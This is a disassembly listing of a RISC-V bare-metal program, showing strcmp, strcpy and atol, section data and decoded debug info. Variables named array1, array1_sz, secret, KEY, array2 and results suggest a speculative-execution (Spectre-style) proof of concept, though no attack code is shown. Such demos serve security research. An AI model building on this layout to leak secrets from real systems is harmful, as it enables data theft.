    80002576:	0ff7f793          	andi	a5,a5,255
    8000257a:	faf70fe3          	beq	a4,a5,80002538 <strcmp+0xe>

  return c1 - c2;
    8000257e:	fef44783          	lbu	a5,-17(s0)
    80002582:	0007871b          	sext.w	a4,a5
    80002586:	fee44783          	lbu	a5,-18(s0)
    8000258a:	2781                	sext.w	a5,a5
    8000258c:	40f707bb          	subw	a5,a4,a5
    80002590:	2781                	sext.w	a5,a5
}
    80002592:	853e                	mv	a0,a5
    80002594:	7422                	ld	s0,40(sp)
    80002596:	6145                	addi	sp,sp,48
    80002598:	8082                	ret

000000008000259a <strcpy>:

char* strcpy(char* dest, const char* src)
{
    8000259a:	7179                	addi	sp,sp,-48
    8000259c:	f422                	sd	s0,40(sp)
    8000259e:	1800                	addi	s0,sp,48
    800025a0:	fca43c23          	sd	a0,-40(s0)
    800025a4:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800025a8:	fd843783          	ld	a5,-40(s0)
    800025ac:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    800025b0:	0001                	nop
    800025b2:	fd043703          	ld	a4,-48(s0)
    800025b6:	00170793          	addi	a5,a4,1
    800025ba:	fcf43823          	sd	a5,-48(s0)
    800025be:	fe843783          	ld	a5,-24(s0)
    800025c2:	00178693          	addi	a3,a5,1
    800025c6:	fed43423          	sd	a3,-24(s0)
    800025ca:	00074703          	lbu	a4,0(a4)
    800025ce:	00e78023          	sb	a4,0(a5)
    800025d2:	0007c783          	lbu	a5,0(a5)
    800025d6:	fff1                	bnez	a5,800025b2 <strcpy+0x18>
    ;
  return dest;
    800025d8:	fd843783          	ld	a5,-40(s0)
}
    800025dc:	853e                	mv	a0,a5
    800025de:	7422                	ld	s0,40(sp)
    800025e0:	6145                	addi	sp,sp,48
    800025e2:	8082                	ret

00000000800025e4 <atol>:

long atol(const char* str)
{
    800025e4:	7179                	addi	sp,sp,-48
    800025e6:	f422                	sd	s0,40(sp)
    800025e8:	1800                	addi	s0,sp,48
    800025ea:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    800025ee:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    800025f2:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    800025f6:	a031                	j	80002602 <atol+0x1e>
    str++;
    800025f8:	fd843783          	ld	a5,-40(s0)
    800025fc:	0785                	addi	a5,a5,1
    800025fe:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002602:	fd843783          	ld	a5,-40(s0)
    80002606:	0007c783          	lbu	a5,0(a5)
    8000260a:	873e                	mv	a4,a5
    8000260c:	02000793          	li	a5,32
    80002610:	fef704e3          	beq	a4,a5,800025f8 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002614:	fd843783          	ld	a5,-40(s0)
    80002618:	0007c783          	lbu	a5,0(a5)
    8000261c:	873e                	mv	a4,a5
    8000261e:	02d00793          	li	a5,45
    80002622:	00f70b63          	beq	a4,a5,80002638 <atol+0x54>
    80002626:	fd843783          	ld	a5,-40(s0)
    8000262a:	0007c783          	lbu	a5,0(a5)
    8000262e:	873e                	mv	a4,a5
    80002630:	02b00793          	li	a5,43
    80002634:	06f71263          	bne	a4,a5,80002698 <atol+0xb4>
    sign = *str == '-';
    80002638:	fd843783          	ld	a5,-40(s0)
    8000263c:	0007c783          	lbu	a5,0(a5)
    80002640:	0007871b          	sext.w	a4,a5
    80002644:	02d00793          	li	a5,45
    80002648:	40f707b3          	sub	a5,a4,a5
    8000264c:	0017b793          	seqz	a5,a5
    80002650:	0ff7f793          	andi	a5,a5,255
    80002654:	fef42223          	sw	a5,-28(s0)
    str++;
    80002658:	fd843783          	ld	a5,-40(s0)
    8000265c:	0785                	addi	a5,a5,1
    8000265e:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    80002662:	a81d                	j	80002698 <atol+0xb4>
    res *= 10;
    80002664:	fe843703          	ld	a4,-24(s0)
    80002668:	87ba                	mv	a5,a4
    8000266a:	078a                	slli	a5,a5,0x2
    8000266c:	97ba                	add	a5,a5,a4
    8000266e:	0786                	slli	a5,a5,0x1
    80002670:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    80002674:	fd843783          	ld	a5,-40(s0)
    80002678:	00178713          	addi	a4,a5,1
    8000267c:	fce43c23          	sd	a4,-40(s0)
    80002680:	0007c783          	lbu	a5,0(a5)
    80002684:	2781                	sext.w	a5,a5
    80002686:	fd07879b          	addiw	a5,a5,-48
    8000268a:	2781                	sext.w	a5,a5
    8000268c:	873e                	mv	a4,a5
    8000268e:	fe843783          	ld	a5,-24(s0)
    80002692:	97ba                	add	a5,a5,a4
    80002694:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    80002698:	fd843783          	ld	a5,-40(s0)
    8000269c:	0007c783          	lbu	a5,0(a5)
    800026a0:	f3f1                	bnez	a5,80002664 <atol+0x80>
  }

  return sign ? -res : res;
    800026a2:	fe442783          	lw	a5,-28(s0)
    800026a6:	2781                	sext.w	a5,a5
    800026a8:	c791                	beqz	a5,800026b4 <atol+0xd0>
    800026aa:	fe843783          	ld	a5,-24(s0)
    800026ae:	40f007b3          	neg	a5,a5
    800026b2:	a019                	j	800026b8 <atol+0xd4>
    800026b4:	fe843783          	ld	a5,-24(s0)
}
    800026b8:	853e                	mv	a0,a5
    800026ba:	7422                	ld	s0,40(sp)
    800026bc:	6145                	addi	sp,sp,48
    800026be:	8082                	ret

Disassembly of section .rodata:

00000000800026c0 <.rodata>:
    800026c0:	6425                	lui	s0,0x9
    800026c2:	252c                	fld	fa1,72(a0)
    800026c4:	0a64                	addi	s1,sp,284
    800026c6:	0000                	unimp
    800026c8:	636d                	lui	t1,0x1b
    800026ca:	6379                	lui	t1,0x1e
    800026cc:	656c                	ld	a1,200(a0)
    800026ce:	0000                	unimp
    800026d0:	696d                	lui	s2,0x1b
    800026d2:	736e                	ld	t1,248(sp)
    800026d4:	7274                	ld	a3,224(a2)
    800026d6:	7465                	lui	s0,0xffff9
	...
    800026e0:	6d49                	lui	s10,0x12
    800026e2:	6c70                	ld	a2,216(s0)
    800026e4:	6d65                	lui	s10,0x19
    800026e6:	6e65                	lui	t3,0x19
    800026e8:	2074                	fld	fa3,192(s0)
    800026ea:	616d                	addi	sp,sp,240
    800026ec:	6e69                	lui	t3,0x1a
    800026ee:	2928                	fld	fa0,80(a0)
    800026f0:	202c                	fld	fa1,64(s0)
    800026f2:	6f66                	ld	t5,88(sp)
    800026f4:	000a216f          	jal	sp,800a46f4 <_end+0x894f4>
    800026f8:	7325                	lui	t1,0xfffe9
    800026fa:	3d20                	fld	fs0,120(a0)
    800026fc:	2520                	fld	fs0,72(a0)
    800026fe:	646c                	ld	a1,200(s0)
    80002700:	000a                	c.slli	zero,0x2
    80002702:	0000                	unimp
    80002704:	0000                	unimp
    80002706:	0000                	unimp
    80002708:	6e28                	ld	a0,88(a2)
    8000270a:	6c75                	lui	s8,0x1d
    8000270c:	296c                	fld	fa1,208(a0)
    8000270e:	0000                	unimp
    80002710:	f8b0                	sd	a2,112(s1)
    80002712:	ffff                	0xffff
    80002714:	fa9a                	sd	t1,368(sp)
    80002716:	ffff                	0xffff
    80002718:	fa8c                	sd	a1,48(a3)
    8000271a:	ffff                	0xffff
    8000271c:	fa9a                	sd	t1,368(sp)
    8000271e:	ffff                	0xffff
    80002720:	fa9a                	sd	t1,368(sp)
    80002722:	ffff                	0xffff
    80002724:	fa9a                	sd	t1,368(sp)
    80002726:	ffff                	0xffff
    80002728:	fa9a                	sd	t1,368(sp)
    8000272a:	ffff                	0xffff
    8000272c:	f88c                	sd	a1,48(s1)
    8000272e:	ffff                	0xffff
    80002730:	fa9a                	sd	t1,368(sp)
    80002732:	ffff                	0xffff
    80002734:	fa9a                	sd	t1,368(sp)
    80002736:	ffff                	0xffff
    80002738:	f82a                	sd	a0,48(sp)
    8000273a:	ffff                	0xffff
    8000273c:	f8a0                	sd	s0,112(s1)
    8000273e:	ffff                	0xffff
    80002740:	fa9a                	sd	t1,368(sp)
    80002742:	ffff                	0xffff
    80002744:	f834                	sd	a3,112(s0)
    80002746:	ffff                	0xffff
    80002748:	f83e                	sd	a5,48(sp)
    8000274a:	ffff                	0xffff
    8000274c:	f83e                	sd	a5,48(sp)
    8000274e:	ffff                	0xffff
    80002750:	f83e                	sd	a5,48(sp)
    80002752:	ffff                	0xffff
    80002754:	f83e                	sd	a5,48(sp)
    80002756:	ffff                	0xffff
    80002758:	f83e                	sd	a5,48(sp)
    8000275a:	ffff                	0xffff
    8000275c:	f83e                	sd	a5,48(sp)
    8000275e:	ffff                	0xffff
    80002760:	f83e                	sd	a5,48(sp)
    80002762:	ffff                	0xffff
    80002764:	f83e                	sd	a5,48(sp)
    80002766:	ffff                	0xffff
    80002768:	f83e                	sd	a5,48(sp)
    8000276a:	ffff                	0xffff
    8000276c:	fa9a                	sd	t1,368(sp)
    8000276e:	ffff                	0xffff
    80002770:	fa9a                	sd	t1,368(sp)
    80002772:	ffff                	0xffff
    80002774:	fa9a                	sd	t1,368(sp)
    80002776:	ffff                	0xffff
    80002778:	fa9a                	sd	t1,368(sp)
    8000277a:	ffff                	0xffff
    8000277c:	fa9a                	sd	t1,368(sp)
    8000277e:	ffff                	0xffff
    80002780:	fa9a                	sd	t1,368(sp)
    80002782:	ffff                	0xffff
    80002784:	fa9a                	sd	t1,368(sp)
    80002786:	ffff                	0xffff
    80002788:	fa9a                	sd	t1,368(sp)
    8000278a:	ffff                	0xffff
    8000278c:	fa9a                	sd	t1,368(sp)
    8000278e:	ffff                	0xffff
    80002790:	fa9a                	sd	t1,368(sp)
    80002792:	ffff                	0xffff
    80002794:	fa9a                	sd	t1,368(sp)
    80002796:	ffff                	0xffff
    80002798:	fa9a                	sd	t1,368(sp)
    8000279a:	ffff                	0xffff
    8000279c:	fa9a                	sd	t1,368(sp)
    8000279e:	ffff                	0xffff
    800027a0:	fa9a                	sd	t1,368(sp)
    800027a2:	ffff                	0xffff
    800027a4:	fa9a                	sd	t1,368(sp)
    800027a6:	ffff                	0xffff
    800027a8:	fa9a                	sd	t1,368(sp)
    800027aa:	ffff                	0xffff
    800027ac:	fa9a                	sd	t1,368(sp)
    800027ae:	ffff                	0xffff
    800027b0:	fa9a                	sd	t1,368(sp)
    800027b2:	ffff                	0xffff
    800027b4:	fa9a                	sd	t1,368(sp)
    800027b6:	ffff                	0xffff
    800027b8:	fa9a                	sd	t1,368(sp)
    800027ba:	ffff                	0xffff
    800027bc:	fa9a                	sd	t1,368(sp)
    800027be:	ffff                	0xffff
    800027c0:	fa9a                	sd	t1,368(sp)
    800027c2:	ffff                	0xffff
    800027c4:	fa9a                	sd	t1,368(sp)
    800027c6:	ffff                	0xffff
    800027c8:	fa9a                	sd	t1,368(sp)
    800027ca:	ffff                	0xffff
    800027cc:	fa9a                	sd	t1,368(sp)
    800027ce:	ffff                	0xffff
    800027d0:	fa9a                	sd	t1,368(sp)
    800027d2:	ffff                	0xffff
    800027d4:	fa9a                	sd	t1,368(sp)
    800027d6:	ffff                	0xffff
    800027d8:	fa9a                	sd	t1,368(sp)
    800027da:	ffff                	0xffff
    800027dc:	fa9a                	sd	t1,368(sp)
    800027de:	ffff                	0xffff
    800027e0:	fa9a                	sd	t1,368(sp)
    800027e2:	ffff                	0xffff
    800027e4:	fa9a                	sd	t1,368(sp)
    800027e6:	ffff                	0xffff
    800027e8:	fa9a                	sd	t1,368(sp)
    800027ea:	ffff                	0xffff
    800027ec:	fa9a                	sd	t1,368(sp)
    800027ee:	ffff                	0xffff
    800027f0:	fa9a                	sd	t1,368(sp)
    800027f2:	ffff                	0xffff
    800027f4:	fa9a                	sd	t1,368(sp)
    800027f6:	ffff                	0xffff
    800027f8:	fa9a                	sd	t1,368(sp)
    800027fa:	ffff                	0xffff
    800027fc:	fa9a                	sd	t1,368(sp)
    800027fe:	ffff                	0xffff
    80002800:	fa9a                	sd	t1,368(sp)
    80002802:	ffff                	0xffff
    80002804:	fa9a                	sd	t1,368(sp)
    80002806:	ffff                	0xffff
    80002808:	fa9a                	sd	t1,368(sp)
    8000280a:	ffff                	0xffff
    8000280c:	fa9a                	sd	t1,368(sp)
    8000280e:	ffff                	0xffff
    80002810:	f8e0                	sd	s0,240(s1)
    80002812:	ffff                	0xffff
    80002814:	f9e0                	sd	s0,240(a1)
    80002816:	ffff                	0xffff
    80002818:	fa9a                	sd	t1,368(sp)
    8000281a:	ffff                	0xffff
    8000281c:	fa9a                	sd	t1,368(sp)
    8000281e:	ffff                	0xffff
    80002820:	fa9a                	sd	t1,368(sp)
    80002822:	ffff                	0xffff
    80002824:	fa9a                	sd	t1,368(sp)
    80002826:	ffff                	0xffff
    80002828:	fa9a                	sd	t1,368(sp)
    8000282a:	ffff                	0xffff
    8000282c:	fa9a                	sd	t1,368(sp)
    8000282e:	ffff                	0xffff
    80002830:	fa9a                	sd	t1,368(sp)
    80002832:	ffff                	0xffff
    80002834:	f8d4                	sd	a3,176(s1)
    80002836:	ffff                	0xffff
    80002838:	fa9a                	sd	t1,368(sp)
    8000283a:	ffff                	0xffff
    8000283c:	fa9a                	sd	t1,368(sp)
    8000283e:	ffff                	0xffff
    80002840:	fa28                	sd	a0,112(a2)
    80002842:	ffff                	0xffff
    80002844:	fa30                	sd	a2,112(a2)
    80002846:	ffff                	0xffff
    80002848:	fa9a                	sd	t1,368(sp)
    8000284a:	ffff                	0xffff
    8000284c:	fa9a                	sd	t1,368(sp)
    8000284e:	ffff                	0xffff
    80002850:	f8fc                	sd	a5,240(s1)
    80002852:	ffff                	0xffff
    80002854:	fa9a                	sd	t1,368(sp)
    80002856:	ffff                	0xffff
    80002858:	fa20                	sd	s0,112(a2)
    8000285a:	ffff                	0xffff
    8000285c:	fa9a                	sd	t1,368(sp)
    8000285e:	ffff                	0xffff
    80002860:	fa9a                	sd	t1,368(sp)
    80002862:	ffff                	0xffff
    80002864:	fa52                	sd	s4,304(sp)
    80002866:	ffff                	0xffff

Disassembly of section .data:

0000000080002880 <array1>:
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
    80002880:	0201                	addi	tp,tp,0
    80002882:	06050403          	lb	s0,96(a0)
    80002886:	0a090807          	0xa090807
    8000288a:	0e0d0c0b          	0xe0d0c0b
    8000288e:	0000100f          	fence.i
	...

Disassembly of section .sdata:

0000000080002920 <array1_sz>:
uint64_t array1_sz = 16;
    80002920:	0010                	0x10
    80002922:	0000                	unimp
    80002924:	0000                	unimp
	...

0000000080002928 <KEY>:
char KEY='Q';
    80002928:	51    	地址 0x0000000080002928 越界。

    8000292c:	 

Disassembly of section .sbss:

000000008000292c <secret>:
int secret;
    8000292c:	0000                	unimp
	...

Disassembly of section .bss:

0000000080002940 <dummyMem>:
	...

0000000080016940 <unused1>:
	...

0000000080016980 <unused2>:
	...

00000000800169c0 <array2>:
	...

000000008001a9c0 <results.2915>:
	...

000000008001b1c0 <counters>:
	...

000000008001b1d0 <counter_names>:
	...

000000008001b1e0 <count.2754>:
    8001b1e0:	0000                	unimp
	...

000000008001b1e4 <sense.2753>:
    8001b1e4:	0000                	unimp
	...

Disassembly of section .tbss:

000000008001b200 <_tls_data>:
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	0d5d                	addi	s10,s10,23
       2:	0000                	unimp
       4:	0004                	0x4
       6:	0000                	unimp
       8:	0000                	unimp
       a:	0108                	addi	a0,sp,128
       c:	02e9                	addi	t0,t0,26
       e:	0000                	unimp
      10:	b60c                	fsd	fa1,40(a2)
      12:	0002                	c.slli	zero,0x0
      14:	3f00                	fld	fs0,56(a4)
      16:	0001                	nop
      18:	4800                	lw	s0,16(s0)
      1a:	0010                	0x10
      1c:	0080                	addi	s0,sp,64
      1e:	0000                	unimp
      20:	6000                	ld	s0,0(s0)
      22:	0004                	0x4
	...
      2c:	0200                	addi	s0,sp,256
      2e:	0601                	addi	a2,a2,0
      30:	03fc                	addi	a5,sp,460
      32:	0000                	unimp
      34:	00003203          	ld	tp,0(zero) # 0 <_tdata_begin>
      38:	0300                	addi	s0,sp,384
      3a:	00003f2b          	0x3f2b
      3e:	0200                	addi	s0,sp,256
      40:	0801                	addi	a6,a6,0
      42:	03fa                	slli	t2,t2,0x1e
      44:	0000                	unimp
      46:	0202                	slli	tp,tp,0x0
      48:	1f05                	addi	t5,t5,-31
      4a:	0004                	0x4
      4c:	0200                	addi	s0,sp,256
      4e:	0702                	slli	a4,a4,0x0
      50:	026e                	slli	tp,tp,0x1b
      52:	0000                	unimp
      54:	0404                	addi	s1,sp,512
      56:	6905                	lui	s2,0x1
      58:	746e                	ld	s0,248(sp)
      5a:	0200                	addi	s0,sp,256
      5c:	0704                	addi	s1,sp,896
      5e:	007a                	c.slli	zero,0x1e
      60:	0000                	unimp
      62:	00009503          	lh	a0,0(ra)
      66:	0300                	addi	s0,sp,384
      68:	00006d67          	0x6d67
      6c:	0200                	addi	s0,sp,256
      6e:	0508                	addi	a0,sp,640
      70:	000000e7          	jalr	zero
      74:	0003b503          	ld	a0,0(t2)
      78:	0300                	addi	s0,sp,384
      7a:	7f69                	lui	t5,0xffffa
      7c:	0000                	unimp
      7e:	0200                	addi	s0,sp,256
      80:	0708                	addi	a0,sp,896
      82:	0075                	c.nop	29
      84:	0000                	unimp
      86:	0802                	slli	a6,a6,0x0
      88:	e205                	bnez	a2,a8 <_tbss_end+0x24>
      8a:	0000                	unimp
      8c:	0200                	addi	s0,sp,256
      8e:	0410                	addi	a2,sp,512
      90:	00000367          	jalr	t1,zero
      94:	0003db03          	lhu	s6,0(t2)
      98:	0400                	addi	s0,sp,512
      9a:	00005407          	0x5407
      9e:	0300                	addi	s0,sp,384
      a0:	03a0                	addi	s0,sp,456
      a2:	0000                	unimp
      a4:	2c05                	addiw	s8,s8,1
      a6:	006d                	c.nop	27
      a8:	0000                	unimp
      aa:	0004db03          	lhu	s6,0(s1)
      ae:	0500                	addi	s0,sp,640
      b0:	6d72                	ld	s10,280(sp)
      b2:	0000                	unimp
      b4:	0300                	addi	s0,sp,384
      b6:	0582                	slli	a1,a1,0x0
      b8:	0000                	unimp
      ba:	9105                	srli	a0,a0,0x21
      bc:	006d                	c.nop	27
      be:	0000                	unimp
      c0:	c205                	beqz	a2,e0 <_tbss_end+0x5c>
      c2:	0002                	c.slli	zero,0x0
      c4:	0600                	addi	s0,sp,768
      c6:	0165                	addi	sp,sp,25
      c8:	0000005b          	0x5b
      cc:	0406                	slli	s0,s0,0x1
      ce:	a605                	j	3ee <_tbss_end+0x36a>
      d0:	000000eb          	0xeb
      d4:	00010c07          	0x10c07
      d8:	0500                	addi	s0,sp,640
      da:	c0a8                	sw	a0,64(s1)
      dc:	0000                	unimp
      de:	0700                	addi	s0,sp,896
      e0:	0242                	slli	tp,tp,0x10
      e2:	0000                	unimp
      e4:	a905                	j	514 <_tbss_end+0x490>
      e6:	000000eb          	0xeb
      ea:	0800                	addi	s0,sp,16
      ec:	0000003f 000000fb 	0xfb0000003f
      f4:	7f09                	lui	t5,0xfffe2
      f6:	0000                	unimp
      f8:	0300                	addi	s0,sp,384
      fa:	0a00                	addi	s0,sp,272
      fc:	0508                	addi	a0,sp,640
      fe:	00011ca3          	sh	zero,25(sp)
     102:	0b00                	addi	s0,sp,400
     104:	04c5                	addi	s1,s1,17
     106:	0000                	unimp
     108:	a505                	j	728 <_tbss_end+0x6a4>
     10a:	0054                	addi	a3,sp,4
     10c:	0000                	unimp
     10e:	0b00                	addi	s0,sp,400
     110:	04cd                	addi	s1,s1,19
     112:	0000                	unimp
     114:	aa05                	j	244 <_tbss_end+0x1c0>
     116:	00cc                	addi	a1,sp,68
     118:	0000                	unimp
     11a:	0004                	0x4
     11c:	00044703          	lbu	a4,0(s0) # ffffffffffff9000 <_end+0xffffffff7ffdde00>
     120:	0500                	addi	s0,sp,640
     122:	0000fbab          	0xfbab
     126:	0300                	addi	s0,sp,384
     128:	01f9                	addi	gp,gp,30
     12a:	0000                	unimp
     12c:	af05                	j	85c <_tbss_end+0x7d8>
     12e:	0094                	addi	a3,sp,64
     130:	0000                	unimp
     132:	080c                	addi	a1,sp,16
     134:	00052d03          	lw	s10,0(a0)
     138:	0700                	addi	s0,sp,896
     13a:	5b19                	li	s6,-26
     13c:	0000                	unimp
     13e:	0d00                	addi	s0,sp,656
     140:	020a                	slli	tp,tp,0x2
     142:	0000                	unimp
     144:	0720                	addi	s0,sp,904
     146:	0001922f          	0x1922f
     14a:	0b00                	addi	s0,sp,400
     14c:	0468                	addi	a0,sp,524
     14e:	0000                	unimp
     150:	01923107          	fld	ft2,25(tp) # 19 <_tdata_begin+0x19>
     154:	0000                	unimp
     156:	0e00                	addi	s0,sp,784
     158:	6b5f 0700 5432      	0x543207006b5f
     15e:	0000                	unimp
     160:	0800                	addi	s0,sp,16
     162:	0004b00b          	0x4b00b
     166:	0700                	addi	s0,sp,896
     168:	5432                	lw	s0,44(sp)
     16a:	0000                	unimp
     16c:	0c00                	addi	s0,sp,528
     16e:	0001ed0b          	0x1ed0b
     172:	0700                	addi	s0,sp,896
     174:	5432                	lw	s0,44(sp)
     176:	0000                	unimp
     178:	1000                	addi	s0,sp,32
     17a:	00056d0b          	0x56d0b
     17e:	0700                	addi	s0,sp,896
     180:	5432                	lw	s0,44(sp)
     182:	0000                	unimp
     184:	1400                	addi	s0,sp,544
     186:	5f0e                	lw	t5,224(sp)
     188:	0078                	addi	a4,sp,12
     18a:	01983307          	fld	ft6,25(a6)
     18e:	0000                	unimp
     190:	0018                	0x18
     192:	013f080f          	0x13f080f
     196:	0000                	unimp
     198:	3408                	fld	fa0,40(s0)
     19a:	0001                	nop
     19c:	a800                	fsd	fs0,16(s0)
     19e:	0001                	nop
     1a0:	0900                	addi	s0,sp,144
     1a2:	007f                	0x7f
     1a4:	0000                	unimp
     1a6:	0000                	unimp
     1a8:	310d                	addiw	sp,sp,-29
     1aa:	0002                	c.slli	zero,0x0
     1ac:	2400                	fld	fs0,8(s0)
     1ae:	02213707          	fld	fa4,34(sp)
     1b2:	0000                	unimp
     1b4:	0000cf0b          	0xcf0b
     1b8:	0700                	addi	s0,sp,896
     1ba:	5439                	li	s0,-18
     1bc:	0000                	unimp
     1be:	0000                	unimp
     1c0:	0004ed0b          	0x4ed0b
     1c4:	0700                	addi	s0,sp,896
     1c6:	543a                	lw	s0,172(sp)
     1c8:	0000                	unimp
     1ca:	0400                	addi	s0,sp,512
     1cc:	0001020b          	0x1020b
     1d0:	0700                	addi	s0,sp,896
     1d2:	0000543b          	srlw	s0,zero,zero
     1d6:	0800                	addi	s0,sp,16
     1d8:	0006030b          	0x6030b
     1dc:	0700                	addi	s0,sp,896
     1de:	543c                	lw	a5,104(s0)
     1e0:	0000                	unimp
     1e2:	0c00                	addi	s0,sp,528
     1e4:	00037a0b          	0x37a0b
     1e8:	0700                	addi	s0,sp,896
     1ea:	543d                	li	s0,-17
     1ec:	0000                	unimp
     1ee:	1000                	addi	s0,sp,32
     1f0:	0004e30b          	0x4e30b
     1f4:	0700                	addi	s0,sp,896
     1f6:	543e                	lw	s0,236(sp)
     1f8:	0000                	unimp
     1fa:	1400                	addi	s0,sp,544
     1fc:	0005720b          	0x5720b
     200:	0700                	addi	s0,sp,896
     202:	0000543f 290b1800 	0x290b18000000543f
     20a:	0004                	0x4
     20c:	0700                	addi	s0,sp,896
     20e:	5440                	lw	s0,44(s0)
     210:	0000                	unimp
     212:	1c00                	addi	s0,sp,560
     214:	0005ad0b          	0x5ad0b
     218:	0700                	addi	s0,sp,896
     21a:	5441                	li	s0,-16
     21c:	0000                	unimp
     21e:	2000                	fld	fs0,0(s0)
     220:	1000                	addi	s0,sp,32
     222:	00000117          	auipc	sp,0x0
     226:	0208                	addi	a0,sp,256
     228:	02624a07          	flq	fs4,38(tp) # 26 <_tdata_begin+0x26>
     22c:	0000                	unimp
     22e:	0001e00b          	0x1e00b
     232:	0700                	addi	s0,sp,896
     234:	0002624b          	fnmsub.s	ft4,ft4,ft0,ft0,unknown
     238:	0000                	unimp
     23a:	0011                	c.nop	4
     23c:	0000                	unimp
     23e:	0700                	addi	s0,sp,896
     240:	624c                	ld	a1,128(a2)
     242:	0002                	c.slli	zero,0x0
     244:	0000                	unimp
     246:	1101                	addi	sp,sp,-32
     248:	051f 0000 4e07      	0x4e070000051f
     24e:	0134                	addi	a3,sp,136
     250:	0000                	unimp
     252:	0200                	addi	s0,sp,256
     254:	8d11                	sub	a0,a0,a2
     256:	0001                	nop
     258:	0700                	addi	s0,sp,896
     25a:	3451                	addiw	s0,s0,-12
     25c:	0001                	nop
     25e:	0400                	addi	s0,sp,512
     260:	0002                	c.slli	zero,0x0
     262:	3208                	fld	fa0,32(a2)
     264:	0001                	nop
     266:	7200                	ld	s0,32(a2)
     268:	0002                	c.slli	zero,0x0
     26a:	0900                	addi	s0,sp,144
     26c:	007f                	0x7f
     26e:	0000                	unimp
     270:	001f 8310 0003      	0x38310001f
     276:	1800                	addi	s0,sp,48
     278:	b15d0703          	lb	a4,-1259(s10) # 18b15 <_tbss_end+0x18a91>
     27c:	0002                	c.slli	zero,0x0
     27e:	0b00                	addi	s0,sp,400
     280:	0468                	addi	a0,sp,524
     282:	0000                	unimp
     284:	02b15e07          	0x2b15e07
     288:	0000                	unimp
     28a:	0b00                	addi	s0,sp,400
     28c:	0480                	addi	s0,sp,576
     28e:	0000                	unimp
     290:	00545f07          	0x545f07
     294:	0000                	unimp
     296:	0b08                	addi	a0,sp,400
     298:	01e8                	addi	a0,sp,204
     29a:	0000                	unimp
     29c:	02b76107          	0x2b76107
     2a0:	0000                	unimp
     2a2:	1110                	addi	a2,sp,160
     2a4:	00000117          	auipc	sp,0x0
     2a8:	02216207          	0x2216207
     2ac:	0000                	unimp
     2ae:	0110                	addi	a2,sp,128
     2b0:	0f00                	addi	s0,sp,912
     2b2:	7208                	ld	a0,32(a2)
     2b4:	0002                	c.slli	zero,0x0
     2b6:	0800                	addi	s0,sp,16
     2b8:	000002c7          	fmsub.s	ft5,ft0,ft0,ft0,rne
     2bc:	000002c7          	fmsub.s	ft5,ft0,ft0,ft0,rne
     2c0:	7f09                	lui	t5,0xfffe2
     2c2:	0000                	unimp
     2c4:	1f00                	addi	s0,sp,944
     2c6:	0f00                	addi	s0,sp,912
     2c8:	cd08                	sw	a0,24(a0)
     2ca:	0002                	c.slli	zero,0x0
     2cc:	1200                	addi	s0,sp,288
     2ce:	330d                	addiw	t1,t1,-29
     2d0:	0004                	0x4
     2d2:	1000                	addi	s0,sp,32
     2d4:	02f37507          	0x2f37507
     2d8:	0000                	unimp
     2da:	0000f60b          	0xf60b
     2de:	0700                	addi	s0,sp,896
     2e0:	f376                	sd	t4,416(sp)
     2e2:	0002                	c.slli	zero,0x0
     2e4:	0000                	unimp
     2e6:	0006750b          	0x6750b
     2ea:	0700                	addi	s0,sp,896
     2ec:	00005477          	0x5477
     2f0:	0800                	addi	s0,sp,16
     2f2:	0f00                	addi	s0,sp,912
     2f4:	3f08                	fld	fa0,56(a4)
     2f6:	0000                	unimp
     2f8:	0d00                	addi	s0,sp,656
     2fa:	0452                	slli	s0,s0,0x14
     2fc:	0000                	unimp
     2fe:	07b0                	addi	a2,sp,968
     300:	23b5                	addiw	t2,t2,13
     302:	0004                	0x4
     304:	0e00                	addi	s0,sp,784
     306:	705f 0700 f3b6      	0xf3b60700705f
     30c:	0002                	c.slli	zero,0x0
     30e:	0000                	unimp
     310:	5f0e                	lw	t5,224(sp)
     312:	0072                	c.slli	zero,0x1c
     314:	0054b707          	fld	fa4,5(s1)
     318:	0000                	unimp
     31a:	0e08                	addi	a0,sp,784
     31c:	775f 0700 54b8      	0x54b80700775f
     322:	0000                	unimp
     324:	0c00                	addi	s0,sp,528
     326:	0001860b          	0x1860b
     32a:	0700                	addi	s0,sp,896
     32c:	46b9                	li	a3,14
     32e:	0000                	unimp
     330:	1000                	addi	s0,sp,32
     332:	0002610b          	0x2610b
     336:	0700                	addi	s0,sp,896
     338:	46ba                	lw	a3,140(sp)
     33a:	0000                	unimp
     33c:	1200                	addi	s0,sp,288
     33e:	5f0e                	lw	t5,224(sp)
     340:	6662                	ld	a2,24(sp)
     342:	0700                	addi	s0,sp,896
     344:	0002cebb          	0x2cebb
     348:	1800                	addi	s0,sp,48
     34a:	0000870b          	0x870b
     34e:	0700                	addi	s0,sp,896
     350:	54bc                	lw	a5,104(s1)
     352:	0000                	unimp
     354:	2800                	fld	fs0,16(s0)
     356:	00012f0b          	0x12f0b
     35a:	0700                	addi	s0,sp,896
     35c:	000132c3          	fmadd.s	ft5,ft2,ft0,ft0,rup
     360:	3000                	fld	fs0,32(s0)
     362:	0002210b          	0x2210b
     366:	0700                	addi	s0,sp,896
     368:	90c5                	srli	s1,s1,0x31
     36a:	0005                	c.nop	1
     36c:	3800                	fld	fs0,48(s0)
     36e:	0002e20b          	0x2e20b
     372:	0700                	addi	s0,sp,896
     374:	0005bac7          	fmsub.s	fs5,fa1,ft0,ft0,rup
     378:	4000                	lw	s0,0(s0)
     37a:	0004d50b          	0x4d50b
     37e:	0700                	addi	s0,sp,896
     380:	deca                	sw	s2,124(sp)
     382:	0005                	c.nop	1
     384:	4800                	lw	s0,16(s0)
     386:	0005c70b          	0x5c70b
     38a:	0700                	addi	s0,sp,896
     38c:	0005f8cb          	fnmsub.s	fa7,fa1,ft0,ft0
     390:	5000                	lw	s0,32(s0)
     392:	5f0e                	lw	t5,224(sp)
     394:	6275                	lui	tp,0x1d
     396:	0700                	addi	s0,sp,896
     398:	cece                	sw	s3,92(sp)
     39a:	0002                	c.slli	zero,0x0
     39c:	5800                	lw	s0,48(s0)
